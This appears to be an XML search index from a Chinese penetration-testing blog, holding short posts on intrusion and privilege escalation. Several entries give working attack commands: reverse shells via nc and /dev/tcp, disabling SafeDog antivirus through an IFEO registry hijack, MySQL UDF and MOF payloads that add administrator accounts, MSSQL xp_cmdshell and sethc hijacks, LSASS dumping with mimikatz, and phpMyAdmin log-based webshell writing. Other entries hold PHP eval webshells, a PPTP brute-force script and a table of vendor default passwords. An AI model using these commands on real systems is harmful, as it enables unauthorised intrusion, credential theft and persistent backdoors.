<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[无关键字进行SQL注入]]></title>
    <url>%2Farchives%2F67b2bdd.html</url>
    <content type="text"><![CDATA[在某公众号看到的,做个记录 替换空格的字符: 09 0A 0B 0C 0D A0 20 替换空格 数据库特性: /!50000select/注释等方法绕过 黑名单过滤: waf大致分为，软waf，硬件waf，云waf。他们的拦截方式可能都不一样，但是大体规则大致相同，也就是黑名单，白名单方式。 比如下面这种软waf是基于黑名单的，发现大部分常用函数都被过滤了: 基本bypass waf的思路 无非就是 空格绕过，注释，内联注释，%0a~,这种形式的baypass思路。这种大家去看sqlmap的tamper源码即可。今天就讲一些不常见的bypass思路。 常规获取表名姿势是:通过information_schema，SCHEMATA，TABLES 等敏感词获取表名,但是一般情况下都被过滤了 mysql 自定义函数绕过:`select * from user where id=aaa()`mysql 特定的内置函数绕过:payload： ?id=1%20and%20polygon(id)类似的函数还有: linestring,multipoint,multilinestring,multipolygon 根据此文章做了一下记录和调整的笔记:无关键字进行SQL注入]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反弹提权姿势集合&&部分免杀技巧]]></title>
    <url>%2Farchives%2F5d509f57.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>外网渗透</category>
        <category>反弹提权</category>
      </categories>
      <tags>
        <tag>反弹提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Win杀软进程在线对比-提权辅助]]></title>
    <url>%2Farchives%2Fe3266f5b.html</url>
    <content type="text"><![CDATA[前言 非常感谢原作者的数据,此功能可以提高提权过程中需要匹配的杀软进程的效率,在原作者的基础上修改了正则. 用法: 通过CMD,tasklist /svc,将进程信息复制粘贴到站点文本框即可列出杀软进程,方便后续绕过与提权,入有不全面,欢迎留言补充~ 链接:Win杀软进程对比辅助&amp;&amp;提权辅助]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PPTP口令爆破]]></title>
    <url>%2Farchives%2F38f7c93b.html</url>
    <content type="text"><![CDATA[PPTP服务器默认开放1723端口1、PPTP brute forcer源代码： https://github.com/BlackArch/thc-pptp-bruterkali默认支持通过字典爆破的命令如下： cat wordlist | thc-pptp-bruter -u zhaodg &lt;IP&gt;2、编写python脚本实现有些设备的PPTP无法使用PPTP brute forcer进行爆破 于是尝试使用python调用pptpsetup实现 通过os.popen执行命令，测试代码如下： import os def test_vpn(ip,name,password): command = &apos;pptpsetup --create testvpn --server &apos;+ip+&apos; --username &apos;+name+&apos; --password &apos;+password+&apos; --encrypt --start&apos; print command vpn_status = os.popen(command).read() print vpn_status if __name__ == &apos;__main__&apos;: test_vpn(&apos;5x.xxx.xxx.xx2&apos;,&apos;zhaodg&apos;,&apos;oZ7iFk25&apos;)测试过程中出现bug： 如果登录成功，进程pptp不会退出，导致脚本阻塞，无法获得回显 只有结束进程pptp后，才能获得回显 所以这里需要使用子进程的方式实现： 子进程执行pptpsetup命令，父进程不等待 随之产生新的问题： 如何获得子进程的结果，判断是否登录成功 这里选择一个简单直接的方法： 等待10秒，然后执行ifconfig，如果登录成功，会产生新的网卡设备ppp0，否则，当前用户名口令错误 登录成功后，选择清理进程，执行命令： pkill pptp清除连接信息：pptpsetup --delete testvpn]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>密码爆破</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络设备的默认密码(交换机、路由器、安全设备)]]></title>
    <url>%2Farchives%2Ffcea265e.html</url>
    <content type="text"><![CDATA[网络设备的默认密码天融信防火墙:不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119天融信防火墙:不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火:墙需要证书（最好用IE浏览器登录）登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666深信服防火墙:（注安全设备管理地址不是唯一的） https://10.251.251.251 https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430启明星辰:https://10.1.5.254:8889 用户名：admin 密码：bane@7766 https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900juniper:登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreenCisco:登录地址:https://192.168.0.1 用户名:admin 密码:ciscoHuawei:登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123H3C:登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430绿盟IPS:https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效网神防火墙GE1口:https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220深信服VPN：51111端口 delanrecover华为VPN：账号：root 密码：mduadmin华为防火墙：admin Admin@123 eudemon eudemon Juniper防火墙： netscreen netscreen huawei/huawei@123 admin/huawei@123 cisco cisco/cisco 迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)山石:192.168.1.1 默认的管理账号为hillstone，密码为hillstone安恒的明御防火墙:admin/adminadmin某堡垒机:shterm/shterm天融信的vpn:test/123456]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
      <tags>
        <tag>默认密码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL_Sever手工注入及技术总结]]></title>
    <url>%2Farchives%2Fd0f5ccf3.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>渗透测试</category>
        <category>漏洞挖掘</category>
        <category>Sql注入</category>
      </categories>
      <tags>
        <tag>Sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见未授权访问漏洞总结]]></title>
    <url>%2Farchives%2F15af7f29.html</url>
    <content type="text"><![CDATA[常见的未授权访问漏洞：Redis 未授权访问漏洞MongoDB 未授权访问漏洞Jenkins 未授权访问漏洞Memcached 未授权访问漏洞JBOSS 未授权访问漏洞VNC 未授权访问漏洞Docker 未授权访问漏洞ZooKeeper 未授权访问漏洞Rsync 未授权访问漏洞Atlassian Crowd 未授权访问漏洞CouchDB 未授权访问漏洞Elasticsearch 未授权访问漏洞Hadoop 未授权访问漏洞Jupyter Notebook 未授权访问漏洞原文:常见的未授权访问漏洞]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Win_提权技巧]]></title>
    <url>%2Farchives%2F452f04ea.html</url>
    <content type="text"><![CDATA[端口转发类反弹shell：shell： nc -e cmd ip port shell: bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1(linux)服务器： nc -vv -lp port端口转发：shell: lcx -slave ip port 127.0.0.1 port服务器： lcx -listen port 33891ANTIFW.exe -s #运行程序，将3389转发到80 ANTIFW.exe -l #关闭程序，恢复cmd探查信息探测类systeminfo ：查看系统版本信息 netstat -ano : 查看系统开放端口 tasklist /svc : 查看系统进程 ipconfig : 查看ip地址 whoami : 查看当前用户 net user : 查看计算机用户列表 net localgroup : 查看计算机用户组列表添加用户类net user mstlab mstlab /add : 添加用户并设置密码 net localgroup administrators mstlab /add : 将用户加入管理组 net user guest /active:yes : 激活guest用户 net user guest mstlab : 更改guest用户的密码KIll DOG:Kill Dog：1.安全狗默认只拦截加管理组，不拦截加用户 法a：利用用户克隆exp：直接克隆administrator的权限 法b：反弹shell读取管理员密码 法c：改注册表替换安全狗的文件，然后重启服务器(redegit /s redegit.reg(redegit.reg见附录))安全狗关闭 2.安全狗账号防护最严程度：拦截添加用户 法a：激活guest，然后克隆用户 法b：反弹shell读取管理员密码 法c：改注册表，重启服务器，关闭安全狗 redegit.reg脚本内容：Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SafeDogGuardCenter.exe] &quot;Debugger&quot;=&quot;C:\WWW\l.php&quot;开启的3389方法：1.通用开3389(优化后)：wmic RDTOGGLE WHERE ServerName=&apos;%COMPUTERNAME%&apos; call SetAllowTSConnections 12.For Win2003:REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f3.For Win2008:REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f4.For Every:cmd开3389 win08 win03 win7 win2012 winxpwin08，三条命令即可:wmic /namespace:\root\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1 wmic /namespace:\root\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName =&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1 reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /fwin2012通用；win7前两条即可。权限需要run as administrator。查询终端端口 ：REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber (or) 终端端口：tasklist /svc查询TermService对应PID和netstat查询的PID对应的端口号 (or) 注册表：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\ Wds dpwd\Tds cp 中PortNumber的值数据库提权:UDF手工提权辅助：select @@basedir; #查看mysql安装目录 select &apos;It is dll&apos; into dumpfile &apos;C:\。。lib::&apos;; #利用NTFS ADS创建lib目录 select &apos;It is dll&apos; into dumpfile &apos;C:\。。lib\plugin::&apos;; #利用NTFS ADS创建plugin目录 select 0xUDFcode into dumpfile &apos;C:\phpstu\MySQL\lib\plugin\mstlab.dll&apos;; #导出udfcode，注意修改udfcode create function cmdshell returns string soname &apos;mstlab.dll&apos;; #用udf创建cmd函数，shell,sys_exec,sys_eval select shell(&apos;cmd&apos;,&apos;net user&apos;); #执行cmd命令show variables like ‘%plugin%’; #查看plugin路径 小技巧：1.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MySQL 注册表中ImagePath的值为mysql安装目录 2.my.ini中datadir的值是数据存放目录 3.UPDATE user set File_priv =&apos;Y&apos;; flush privileges; 强制加file权限MOF手工提权辅助：pragma namespace(&quot;\\.\root\subscription&quot;) instance of __EventFilter as { EventNamespace = &quot;Root\Cimv2&quot;; Name = &quot;filtP2&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; &quot;And TargetInstance.Second = 5&quot;; QueryLanguage = &quot;WQL&quot;; }; instance of ActiveScriptEventConsumer as { Name = &quot;consPCSV2&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;) WSH.run(\&quot;net.exe user admintony admin /add&amp;&amp;net.exe localgroup administrators admintony /add\&quot;)&quot;; }; instance of __FilterToConsumerBinding { Consumer = ; Filter = ; }; 保存为 1.mof 然后mysql执行：select load_file(&apos;D:/wwwroot/1.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;SA提权辅助：1.判断扩展存储是否存在：select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; AND name= &apos;xp_cmdshell&apos; select count(*) from master.dbo.sysobjects where name=&apos;xp_regread&apos;恢复：exec sp_dropextendedproc &apos;xp_cmdshell&apos; exec sp_dropextendedproc xp_cmdshell,&apos;xplog70.dll&apos; EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;(SQL2005)2.列目录：exec master..xp_cmdshell &apos;ver&apos; (or) exec master..xp_dirtree &apos;c:\&apos;,1,1 (or) drop table black create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))-- insert into black exec master..xp_cmdshell &apos;dir c:\&apos; select top 1 mulu from black where id=1 xp_cmdshell被删除时，可以用(4.a)开启沙盒模式，然后(4.b)方法提权3.备份启动项：alter database [master] set RECOVERY FULL create table cmd (a image) backup log [master] to disk = &apos;c:\cmd1&apos; with init insert into cmd (a) values (0x(batcode)) backup log [master] to disk = &apos;C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\start.bat&apos; drop table cmd4.映像劫持xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&apos;,&apos;debugger&apos;,&apos;reg_sz&apos;,&apos;c:\windows\system32\cmd.exe&apos;5.沙盒模式提权：法a：exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\JET\Engines&apos;,&apos;SandBoxMode&apos;,&apos;REG_DWORD&apos;,0;关闭沙盒模式 法b：Select * From OpenRowSet(&apos;Microsoft.Jet.OLEDB.4.0&apos;,&apos;;Database=c:\windows\system32\ias\ias.mdb&apos;,&apos;select shell(&quot;net user mstlab mstlab /add&quot;)&apos;); #or c:\windows\system32\ias\dnary.mdb string类型用此。 开启OpenRowSet：exec sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;exec sp_configure &apos;Ad Hoc Distributed Queries&apos;,1;RECONFIGURE;6.xp_regwrite操作注册表exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Windows\currentversion un&apos;,&apos;black&apos;,&apos;REG_SZ&apos;,&apos;net user test test /add&apos; 开启xp_oacreate:exec sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;exec sp_configure &apos;Ole Automation Procedures&apos;,1;RECONFIGURE;]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>提权(系统级)</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透工具库总纲]]></title>
    <url>%2Farchives%2Ff71d256c.html</url>
    <content type="text"><![CDATA[漏洞及渗透练习平台：WebGoat漏洞练习平台：https://github.com/WebGoat/WebGoatwebgoat-legacy漏洞练习平台:https://github.com/WebGoat/WebGoat-Legacyzvuldirll漏洞练习平台：https://github.com/710leo/ZVulDrillvulapps漏洞练习平台：https://github.com/Medicean/VulAppsdvwa漏洞练习平台：https://github.com/RandomStorm/DVWA数据库注入练习平台 ：https://github.com/Audi-1/sqli-labs用node编写的漏洞练习平台，like OWASP Node Goat：https://github.com/cr0hn/vulnerable-nodeRuby编写的一款工具，生成含漏洞的虚拟机：https://github.com/cliffe/secgen花式扫描器 ：Nmap端口扫描器：https://github.com/nmap/nmap本地网络扫描器：https://github.com/SkyLined/LocalNetworkScanner子域名扫描器：https://github.com/lijiejie/subDomainsBrute https://github.com/aboul3la/Sublist3r https://github.com/TheRook/subbrute https://github.com/infosec-au/altdnslinux漏洞扫描：https://github.com/future-architect/vuls基于端口扫描以及关联CVE:https://github.com/m0nad/HellRaiser漏洞路由扫描器：https://github.com/jh00nbr/Routerhunter-2.0迷你批量信息泄漏扫描脚本：https://github.com/lijiejie/BBScanWaf类型检测工具：https://github.com/EnableSecurity/wafw00f服务器端口弱口令扫描器：https://github.com/wilson9x1/fenghuangscanner_v3Fox-scan扫描器：https://github.com/fengxuangit/Fox-scan/信息搜集工具 :社工收集器：https://github.com/n0tr00t/SregGithub信息搜集：https://github.com/sea-god/gitscangithub Repo信息搜集工具：https://github.com/metac0rtex/GitHarvester信息探测及扫描工具：https://github.com/darryllane/Bluto内部网络信息扫描器：https://github.com/sowish/LNScan远程桌面登录扫描器：https://github.com/linuz/Sticky-Keys-Slayer网络基础设施渗透工具https://github.com/SECFORCE/spartaSNMAP密码破解:https://github.com/SECFORCE/SNMP-BruteJSFinder_js抓取工具:https://github.com/Threezh1/JSFinderWEB：webshell大合集：https://github.com/tennc/webshell渗透以及web攻击脚本：https://github.com/brianwrf/hackUtilsweb渗透小工具大合集：https://github.com/rootphantomer/hacktoolsfor_meXSS数据接收平台：https://github.com/firesunCN/BlueLotus_XSSReceiverXSS与CSRF工具：https://github.com/evilcos/xssorxss多功能扫描器：https://github.com/shawarkhanethicalhacker/BruteXSSweb漏洞扫描器:https://github.com/andresriancho/w3afWEB漏洞扫描器：https://github.com/sullo/nikto渗透常用小工具包：https://github.com/leonteale/pentestpackageweb目录扫描器:https://github.com/maurosoria/dirsearchweb向命令注入检测工具：https://github.com/stasinopoulos/commix自动化SQL注入检查工具：https://github.com/epinna/tplmapSSL扫描器：https://github.com/rbsec/sslscan安全工具集合：https://github.com/codejanus/ToolSuiteapache日志分析器：https://github.com/mthbernardes/ARTLASphp代码审计工具：https://github.com/pwnsdx/BadCodeweb指纹识别扫描：https://github.com/urbanadventurer/whatweb检查网站恶意攻击：https://github.com/ciscocsirt/malspiderwordprees漏洞扫描器：https://github.com/wpscanteam/wpscan固件漏洞扫描器：https://github.com/misterch0c/firminator_backend数据库注入工具https://github.com/sqlmapproject/sqlmapWeb代理：https://github.com/zt2/sqli-hunter新版中国菜刀：https://github.com/Chora10/Cknifegit泄露利用EXP：https://github.com/lijiejie/GitHack浏览器攻击框架：https://github.com/beefproject/beef自动化绕过WAF脚本：https://github.com/khalilbijjou/WAFNinja https://github.com/owtf/wafbypasser一款开源WAF：https://github.com/SpiderLabs/ModSecurityhttp命令行客户端：https://github.com/jkbrzt/httpie浏览器调试利器：https://github.com/firebug/firebugDISCUZ漏洞扫描器：https://github.com/code-scan/dzscan自动化代码审计工具https://github.com/wufeifei/cobra浏览器攻击框架：https://github.com/julienbedard/browsersploittomcat自动后门部署：https://github.com/mgeeky/tomcatWarDeployer网络空间指纹扫描器：https://github.com/nanshihui/Scan-Tburpsuit之J2EE扫描插件：https://github.com/ilmila/J2EEScanwindows域渗透工具：mimikatz明文注入：https://github.com/gentilkiwi/mimikatzPowershell渗透库合集：https://github.com/PowerShellMafia/PowerSploitPowershell tools合集：https://github.com/clymb3r/PowerShellpowershell的mimikittenz:https://github.com/putterpanda/mimikittenz域渗透教程:https://github.com/l3m0n/pentest_studyFuzz:Web向Fuzz工具https://github.com/xmendez/wfuzzHTTP暴力破解，撞库攻击脚本https://github.com/lijiejie/htpwdScan漏洞利用及攻击框架：msf框架：https://github.com/rapid7/metasploit-frameworkpocsscan攻击框架：https://github.com/erevus-cn/pocscanPocsuite攻击框架:https://github.com/knownsec/PocsuiteBeebeeto攻击框架：https://github.com/n0tr00t/Beebeeto-framework漏洞POC&amp;EXP:ExploitDB官方git版本:https://github.com/offensive-security/exploit-databasephp漏洞代码分析：https://github.com/80vul/phpcodzCVE-2016-2107:https://github.com/FiloSottile/CVE-2016-2107CVE-2015-7547 POC：https://github.com/fjserna/CVE-2015-7547JAVA反序列化POC生成工具:https://github.com/frohoff/ysoserialJAVA反序列化EXP:https://github.com/foxglovesec/JavaUnserializeExploitsJenkins CommonCollections EXP:https://github.com/CaledoniaProject/jenkins-cli-exploitCVE-2015-2426 EXP (windows内核提权):https://github.com/vlad902/hacking-team-windows-kernel-lpeuse docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):https://github.com/hxer/vulnappphp7缓存覆写漏洞Demo及相关工具:https://github.com/GoSecure/php7-opcache-overrideXcodeGhost木马样本:https://github.com/XcodeGhostSource/XcodeGhost中间人攻击及钓鱼中间人攻击框架:https://github.com/secretsquirrel/the-backdoor-factory https://github.com/secretsquirrel/BDFProxy https://github.com/byt3bl33d3r/MITMfInject code, jam wifi, and spy on wifi users:https://github.com/DanMcInerney/LANs.py中间人代理工具:https://github.com/intrepidusgroup/mallorywifi钓鱼:https://github.com/sophron/wifiphisher密码破解：密码破解工具:https://github.com/shinnok/johnny本地存储的各类密码提取利器:https://github.com/AlessandroZ/LaZagne二进制及代码分析工具：二进制分析工具https://github.com/devttys0/binwalk系统扫描器https://github.com/quarkslab/binmaprp:https://github.com/0vercl0k/rpWindows Exploit Development工具https://github.com/lillypad/badger二进制静态分析工具（python）:https://github.com/bdcht/amocoPython Exploit Development Assistance for GDB:https://github.com/longld/peda对BillGates Linux Botnet系木马活动的监控工具https://github.com/ValdikSS/billgates-botnet-tracker木马配置参数提取工具:https://github.com/kevthehermit/RATDecodersShellphish编写的二进制分析工具（CTF向）:https://github.com/angr/angr针对python的静态代码分析工具:https://github.com/yinwang0/pysonar2一个自动化的脚本（shell）分析工具，用来给出警告和建议:https://github.com/koalaman/shellcheck基于AST变换的简易Javascript反混淆辅助工具:https://github.com/ChiChou/etacsufboEXP编写框架及工具：二进制EXP编写工具:https://github.com/t00sh/rop-toolCTF Pwn 类题目脚本编写框架:https://github.com/Gallopsled/pwntoolsan easy-to-use io library for pwning development:https://github.com/zTrix/zio跨平台注入工具:https://github.com/frida/frida哈希长度扩展攻击EXP：https://github.com/citronneur/rdpy隐写：隐写检测工具https://github.com/abeluck/stegdetect各类安全资料:data_hacking合集:https://github.com/ClickSecurity/data_hackingmobile-security-wiki:https://github.com/exploitprotocol/mobile-security-wiki书籍《reverse-engineering-for-beginners》:https://github.com/veficos/reverse-engineering-for-beginners一些信息安全标准及设备配置:https://github.com/luyg24/IT_securityAPT相关笔记:https://github.com/kbandla/APTnotesKcon资料:https://github.com/knownsec/KCon《DO NOT FUCK WITH A HACKER》:https://github.com/citypw/DNFWAH各类安全脑洞图：https://github.com/phith0n/Mind-Map信息安全流程图：https://github.com/SecWiki/sec-chart/ tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428各类CTF资源近年ctf writeup大全:https://github.com/ctfs/write-ups-2016 https://github.com/ctfs/write-ups-2015 https://github.com/ctfs/write-ups-2014fbctf竞赛平台Demo:https://github.com/facebook/fbctfctf Resources:https://github.com/ctfs/resourcesctf及黑客资源合集:https://github.com/bt3gl/My-Gray-Hacker-Resourcesctf和安全工具大合集:https://github.com/zardus/ctf-toolsctf向 python工具包https://github.com/P1kachu/v0lt各类编程资源:大礼包（什么都有）:https://github.com/bayandin/awesome-awesomenessbash-handbook:https://github.com/denysdovhan/bash-handbookpython资源大全:https://github.com/jobbole/awesome-python-cngit学习资料:https://github.com/xirong/my-git安卓开源代码解析https://github.com/android-cn/android-open-projectpython框架，库，资源大合集:https://github.com/vinta/awesome-pythonJS 正则表达式库（用于简化构造复杂的JS正则表达式）:https://github.com/VerbalExpressions/JSVerbalExpressionsPython：python 正则表达式库（用于简化构造复杂的python正则表达式）:https://github.com/VerbalExpressions/python任务管理以及命令执行库:https://github.com/pyinvoke/invokepython exe打包库:https://github.com/pyinstaller/pyinstallerVeil-Evasion免杀项目：https://github.com/Veil-Framework/Veil-Evasionpy3 爬虫框架:https://github.com/orf/cyborg一个提供底层接口数据包编程和网络协议支持的python库:https://github.com/CoreSecurity/impacket python requests 库:https://github.com/kennethreitz/requestspython 实用工具合集:https://github.com/mahmoud/boltonspython爬虫系统:https://github.com/binux/pyspider科学上网：科学上网工具https://github.com/XX-net/XX-Net福利：微信自动抢红包动态库https://github.com/east520/AutoGetRedEnv微信抢红包插件（安卓版）https://github.com/geeeeeeeeek/WeChatLuckyMoneyhardsed神器:https://github.com/yangyangwithgnu/hardseed甲方安全工程师生存指南web索引及日志搜索工具：https://github.com/thomaspatzke/WASE开源日志采集器：https://github.com/wgliang/logcool扫描CS结构的web debugerhttps://github.com/Kozea/wdb恢复sqlite数据库删除注册信息：https://github.com/aramosf/recoversqlite/gps欺骗检测工具:https://github.com/zxsecurity/gpsnitch应急处置响应框架:https://github.com/biggiesmallsAG/nightHawkResponse web安全开发指南:https://github.com/FallibleInc/security-guide-for-developers各个知名厂商漏洞测试报告模板：https://github.com/juliocesarfort/public-pentesting-reports linux下恶意代码检测包： https://github.com/rfxn/linux-malware-detect操作系统运行指标可视化框架：https://github.com/facebook/osquery恶意代码分析系统：https://github.com/cuckoosandbox/cuckoo定期搜索及存储web应用：https://github.com/Netflix/Scumblr事件响应框架：https://github.com/google/grr综合主机监控检测平台：https://github.com/ossec/ossec-hids分布式实时数字取证系统：https://github.com/mozilla/migMicrosoft &amp; Unix 文件系统及硬盘取证工具：https://github.com/sleuthkit/sleuthkit蜜罐：SSH蜜罐：https://github.com/desaster/kippo蜜罐集合资源：https://github.com/paralax/awesome-honeypots kippo进阶版蜜罐：https://github.com/micheloosterhof/cowrieSMTP 蜜罐：https://github.com/awhitehatter/mailoneyweb应用程序蜜罐：https://github.com/mushorg/glastopf数据库蜜罐：https://github.com/jordan-wright/elastichoneyweb蜜罐：https://github.com/atiger77/Dionaea远控：用gmail充当C&amp;C服务器的后门https://github.com/byt3bl33d3r/gcat开源的远控：https://github.com/UbbeLoL/uRATc#远控：https://github.com/hussein-aitlahcen/BlackHole原文 Python工具库安全工具总纲]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[两步完成利用procdump64+mimikatz获取win用户密码]]></title>
    <url>%2Farchives%2Ff86fa73d.html</url>
    <content type="text"><![CDATA[两步完成利用procdump64+mimikatz获取win用户密码使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exeprocdump64.exe -accepteula -ma lsass.exe lsass.dmp (注:必须使用管理员权限) 2.执行mimikatzmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit(注:必须使用管理员权限) 成功获取明文密码]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>提权(系统级)</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Phpmyadmin_getshell]]></title>
    <url>%2Farchives%2F694daf10.html</url>
    <content type="text"><![CDATA[查看是否有写文件权限show global variables like &apos;%secure%&apos;;查看日志文件存放路径及开启SHOW GLOBAL VARIABLES LIKE &apos;%general_log%&apos; set global general_log = ONgetshell 三大命令:set global general_log=&apos;on&apos;; SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;; //绝对路径 SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;;]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>外网渗透</category>
        <category>提权(WEB)</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Structs全版本漏洞利用总结]]></title>
    <url>%2Farchives%2F91cb19b5.html</url>
    <content type="text"><![CDATA[前言Structs2框架目前已知的漏洞编号如下：S2-005 S2-009 S2-016 (含S2-013) S2-019 S2-020 S2-021 S2-032 S2-037（含S2-033) DevMode S2-045 S2-046 S2-048 S2-052 S2-055 S2-057 目前公开的工具，唯独缺失052和055的利用。S2-055比较特殊，严格来说055本身无问题，问题出在其使用的Jackson版本过低在进行JSON反序列化的时候没有任何类型过滤导致远程代码执行。也就是说S2-055本质上是Jackson反序列化，其CVE编号为CVE-2017-7525。本文将对缺失的S2-055以及S2-052做漏洞复现. 原文:struct 2 全版本漏洞总结]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[彻底理解Windows认证 - 议题解读]]></title>
    <url>%2Farchives%2F58b20026.html</url>
    <content type="text"><![CDATA[彻底理解Windows认证 - 议题解读:原文:彻底理解window认证]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[「disablefunc绕过」一种绕过php disablefunc的方法复现]]></title>
    <url>%2Farchives%2F2ea7b633.html</url>
    <content type="text"><![CDATA[前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好的同名函数。 环境搭建ubuntu+apache2+php7.2 配置/etc/php/7.2/apache2/php.ini 设置disable_functions = system,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,然后重启apache2 服务器 这样就能把system禁用了 然后在网站的根目录上放一个shell.php &lt;?php @eval($_GET[&apos;fz41&apos;]);?&gt;访问shell.php可以正常执行php的代码，不能执行系统函数。 测试访问http://192.168.44.139/shell.php?fz41=phpinfo();可以看见phpinfo()的信息 访问http://192.168.44.139/shell.php?fz41=system(ls);没有任何回显环境配置成功，我们的任务就是通过劫持函数的方法来绕过这个disable_functions 的限制，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。 